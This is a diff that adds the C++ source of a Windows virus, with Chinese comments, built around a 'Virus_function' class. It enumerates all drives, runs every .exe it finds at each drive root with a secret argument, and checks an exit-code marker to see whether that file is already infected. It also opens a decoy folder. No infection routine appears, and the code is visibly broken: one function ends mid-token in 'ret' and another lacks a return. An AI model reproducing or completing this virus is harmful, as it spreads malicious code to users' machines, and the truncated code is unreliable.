@@ -1,0 +1,247 @@
+#include <iostream>
+#include <stdio.h>
+#include <windows.h>
+#include <io.h>
+#include <process.h>
+
+#define size_N 1000
+#define File_size 10000
+
+using namespace std;
+char *Oneself_Path;
+
+class Virus_function
+{
+public:
+    Virus_function();
+    int Traversal_directory(char *path,char *file,char *folder);   //返回0表示遍历失败，1表示遍历成功
+    int Check_exe_File(char *path,char *file);        //返回0:没有文件被感染，1:1个文件被感染，2...；3....
+private:
+    char Temp_path[size_N];
+    char *tmp;
+    char *tmp2;
+    char File_Name[size_N];
+    char Target_File[size_N];
+    FILE *TarFile,*oneself;
+};
+
+Virus_function::Virus_function()
+{
+    //变量初始化
+    memset(Temp_path,NULL,sizeof(Temp_path));
+    tmp=NULL;
+    tmp2=NULL;
+    memset(File_Name,NULL,sizeof(File_Name));
+    memset(Target_File,NULL,sizeof(Target_File));
+    TarFile=NULL;
+    oneself=NULL;
+}
+
+int Virus_function::Traversal_directory(char *path,char *file,char *folder)
+{
+    if(access(path,0)) return 0;
+    WIN32_FIND_DATA FindFileData;
+    strcpy(Temp_path,path);
+    strcat(Temp_path,"\\*.*");
+    HANDLE hFind=FindFirstFile(Temp_path,&FindFileData);  //读取目录下第一个文件
+    if(hFind==INVALID_HANDLE_VALUE)  return 0;
+    memset(file,NULL,File_size);
+    memset(folder,NULL,File_size);
+    do
+    {
+        if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+        {
+            //表示扫描到文件夹
+            strcat(folder,FindFileData.cFileName);
+            for(tmp=folder; 1; tmp++)
+                if(*tmp==NULL)
+                {
+                    *tmp=',';
+                    break;
+                }
+        }
+        else
+        {
+            //表示扫描到文件
+            strcat(file,FindFileData.cFileName);
+            for(tmp=file; 1; tmp++)
+                if(*tmp==NULL)
+                {
+                    *tmp=',';
+                    break;
+                }
+        }
+    }
+    while(FindNextFile(hFind,&FindFileData));
+    for(tmp=file; 1; tmp++)
+        if(*tmp==NULL)
+        {
+            *(--tmp)=NULL;
+            break;
+        }
+    for(tmp=folder; 1; tmp++)
+        if(*tmp==NULL)
+        {
+            *(--tmp)=NULL;
+            break;
+        }
+    FindClose(hFind);
+    return 1;
+}
+
+int Virus_function::Check_exe_File(char *path,char *file)
+{
+    //检测各个磁盘下的exe文件是否被感染
+    int Achieve_returned_value(char *);
+    int i,j,Suffix_Len=0,Number=0,tmp_num=0;
+    char *p=NULL;
+    char *Suffix_Start=NULL,*Suffix_End=NULL,Suffix_type[size_N],Target_File_Buff[size_N],Oneself_Buff[size_N];
+    for(i=0,tmp=file; *tmp!=NULL; tmp++)
+    {
+        if(*tmp!=',')
+        {
+            File_Name[i]=*tmp;
+            i++;
+        }
+        else
+        {
+            i=0;
+            Suffix_Start=NULL;
+            for(tmp2=File_Name; *tmp2!=NULL; tmp2++)
+                if(*tmp2=='.') Suffix_Start=tmp2;
+            if(Suffix_Start==NULL) continue;
+            Suffix_Start++;
+            Suffix_End=tmp2;
+            Suffix_Len=Suffix_End-Suffix_Start;       //获取后缀长度
+            memset(Suffix_type,NULL,sizeof(Suffix_type));
+            memcpy(Suffix_type,Suffix_Start,Suffix_Len);
+            if((strcmp(Suffix_type,"exe")==0)||(strcmp(Suffix_type,"EXE")==0))
+            {
+                strcat(Target_File,path);
+                if(Target_File[strlen(path)-1]!='\\')
+                    Target_File[strlen(path)]='\\';
+                strcat(Target_File,File_Name);     //获取目标文件的路径
+                tmp_num++;
+                if(Achieve_returned_value(Target_File)==1)
+                    Number++;
+                memset(Target_File,NULL,sizeof(Target_File));
+            }
+            memset(File_Name,NULL,sizeof(File_Name));
+        }
+    }
+    printf("\npath-->%s-->%d\n",path,tmp_num);
+    return Number;
+}
+void Open_Folder(void *cmd_tmp)
+{
+    const char *cmd=(char *)cmd_tmp;
+    //system(cmd);
+    _endthread();
+}
+
+int Achieve_returned_value(char *Target_File)
+{
+    char Command[size_N];
+    BOOL bNewProcess;
+    DWORD dwExternExitCode;
+
+    memset(Command,NULL,sizeof(Command));
+    PROCESS_INFORMATION process_info; //结构体
+    STARTUPINFO startup_info = {sizeof(STARTUPINFO)}; //STARTUPINFO结构　该结构用于指定新进程的主窗口特性
+
+    sprintf(Command,"%s zhimakaimen",Target_File);
+    bNewProcess = CreateProcess(Target_File, Command,
+                                NULL, NULL,
+                                FALSE, CREATE_NEW_CONSOLE,
+                                NULL, NULL,
+                                &startup_info, &process_info);
+
+    if (!bNewProcess)
+        return 0;           //主函数返回值获取失败
+// 不使用的句柄最好关掉
+    CloseHandle(process_info.hThread);
+
+    WaitForSingleObject(process_info.hProcess, 10000);  //挂起此线程等待句柄信息
+    GetExitCodeProcess(process_info.hProcess, &dwExternExitCode);
+    CloseHandle(process_info.hProcess);      //关闭句柄
+    if(dwExternExitCode==520) ret
+}
+
+int main(int argc,char *argv[])
+{
+    Oneself_Path=argv[0];
+    int guide(char *);     //引导模块
+
+    if(guide(argv[0])==0)   //0表示不需要感染，1表示需要感染
+    {
+        ;
+    }
+    system("pause");
+}
+int guide(char *virus_currpath)
+{
+    char *Name_Start=NULL,*Name_End=NULL,*TEMP=NULL,file_name[size_N],cmd[size_N],Drives[size_N];
+    int Name_Len=0;
+    /*===============打开同目录下与自己同名的文件夹====================*/
+    for(TEMP=virus_currpath; *TEMP!=NULL; TEMP++)
+        if(*TEMP=='\\') Name_Start=TEMP;
+    Name_Start++;            //文件名定位到首字母
+    Name_End=strchr(Name_Start,'.');
+    Name_Len=Name_End-Name_Start;
+    memset(file_name,NULL,sizeof(file_name));
+    memcpy(file_name,Name_Start,Name_Len);        //获取到与自己同名的文件夹名
+    memset(cmd,NULL,sizeof(cmd));
+    sprintf(cmd,"explorer /e,%s",file_name);
+    _beginthread(Open_Folder,0,(void *)cmd);       //打开文件夹
+    /*=================================================================*/
+
+    /*==============检测当前计算机是否已被感染===========================*/
+    class Virus_function func;
+    char file[File_size],folder[File_size],path[size_N];
+    int k,i;
+    memset(Drives,NULL,sizeof(Drives));
+    memset(path,NULL,sizeof(path));
+    memset(file,NULL,sizeof(file));
+    memset(folder,NULL,sizeof(folder));
+    GetLogicalDriveStrings(sizeof(Drives),Drives);    //获取所有磁盘列表
+    for(i=0; i<size_N; i++)
+        printf("%c",Drives[i]);
+    for(TEMP=Drives,k=0,i=0; k<2;)
+    {
+        if(*TEMP==NULL)
+        {
+            k++;
+            TEMP++;
+            continue;
+        }
+        k=0;
+        path[i]=*TEMP;
+        i++;
+        TEMP++;
+        if(*TEMP==NULL)
+        {
+            if(strcmp(path,"A:\\")==0) goto skip;
+            if(func.Traversal_directory(path,file,folder))
+            {
+                //printf("\npath-->%s\nfile-->%s\n",path,file);
+                printf("\n%s-->%d\n",path,func.Check_exe_File(path,file));
+            }
+skip:
+            memset(path,NULL,sizeof(path));
+            memset(file,NULL,sizeof(file));
+            memset(folder,NULL,sizeof(folder));
+            TEMP++;
+            i=0;
+        }
+    }
+}
+
+
+
+
+
+
+
+
+
+
